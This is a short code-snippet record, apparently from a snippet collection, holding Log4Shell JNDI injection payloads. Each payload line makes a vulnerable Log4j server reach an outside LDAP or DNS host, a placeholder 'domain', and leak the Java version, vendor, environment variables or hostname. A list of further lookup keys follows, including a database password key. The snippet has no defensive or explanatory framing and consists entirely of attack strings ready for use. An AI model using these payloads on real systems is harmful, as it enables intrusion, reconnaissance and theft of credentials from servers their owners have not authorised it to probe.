---
id: 06fffb22-0084-4818-a8e4-76ee48dc99cf
type: code
language: Bash
verified: false
created_at: '2023-04-06T03:55:56.668627+00:00'
updated_at: '2023-04-06T03:55:56.675484+00:00'
---

# Code Snippet 06fffb22

**Language**: Bash

```bash
# Identify Java version and hostname
${jndi:ldap://${java:version}.domain/a}
${jndi:ldap://${env:JAVA_VERSION}.domain/a}
${jndi:ldap://${sys:java.version}.domain/a}
${jndi:ldap://${sys:java.vendor}.domain/a}
${jndi:ldap://${hostName}.domain/a}
${jndi:dns://${hostName}.domain}

# More enumerations keywords and variables
java:os
docker:containerId
web:rootDir
bundle:config:db.password
```
